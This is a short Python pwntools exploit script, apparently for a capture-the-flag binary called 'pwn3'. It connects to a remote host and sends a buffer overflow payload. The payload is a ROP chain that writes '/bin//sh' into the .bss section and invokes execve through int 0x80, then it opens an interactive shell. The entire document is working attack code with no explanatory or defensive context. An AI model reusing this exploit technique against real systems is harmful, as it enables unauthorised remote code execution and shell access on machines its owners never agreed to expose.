from pwn import *
p=remote('121.42.189.18',10005)
#p=process('./pwn3')
print p.recv()
bss=ELF('./pwn3').bss()
#data
int80=0x080493e1
pppr=0x0806e850
eax_r=0x080bae06
elf=ELF('./pwn3')
offset=32
pop_edx_ret=0x0806e82a
mov_esp_exc_ret=0x080bb066
mov_ptr_eax_edx_ret=0x0807b301
payload=offset*'A'+p32(pop_edx_ret)+p32(0x6e69622f)+p32(eax_r)+p32(bss)+p32(mov_ptr_eax_edx_ret)+p32(pop_edx_ret)+p32(0x68732f2f)+p32(eax_r)+p32(bss+4)+p32(mov_ptr_eax_edx_ret)+p32(eax_r)+p32(11)+p32(pppr)+p32(0)+p32(0)+p32(bss)+p32(int80)
p.sendline(payload)
p.interactive();
